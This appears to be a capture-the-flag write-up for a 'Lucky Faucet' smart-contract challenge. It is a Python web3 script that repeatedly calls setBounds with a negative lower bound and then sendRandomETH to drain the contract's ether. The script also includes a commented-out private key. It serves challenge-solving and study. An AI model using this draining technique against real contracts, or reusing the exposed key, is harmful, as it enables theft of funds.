Lucky Faucet
===

```python=
from web3 import Web3
from solcx import compile_files, install_solc

target   = ""0xD2eeBe315477b54FBFd6208b0CCd09B1903e4B1B""
addr = ""0x4758698a939362EBdc5fa7D9a446822295b08AAC""
install_solc('0.7.6')
compiled = compile_files([""LuckyFaucet.sol""], output_values=[""abi""], solc_version=""0.7.6"")
abi = compiled['LuckyFaucet.sol:LuckyFaucet']['abi']

w3 = Web3(Web3.HTTPProvider('http://83.136.253.226:52835'))
contract = w3.eth.contract(address=target, abi=abi)
#account = w3.eth.accounts.privateKeyToAccount(""0x4dc4b6652a313324d14e09926498cc0d6b5bcc787ff2de1fa6dc4a79ba85c3f0"")
for _ in range(100):
    print(w3.eth.wait_for_transaction_receipt(contract.functions.setBounds(-1,100_000_000).transact()))
    print(w3.eth.wait_for_transaction_receipt(contract.functions.sendRandomETH().transact()))
    print(""current balance"", w3.eth.get_balance(target), ""ether"")
```
![](https://hedgedoc.sharkmoos.tech/uploads/75a2646b-c297-4f3e-ab4d-b58487fa79e6.png)
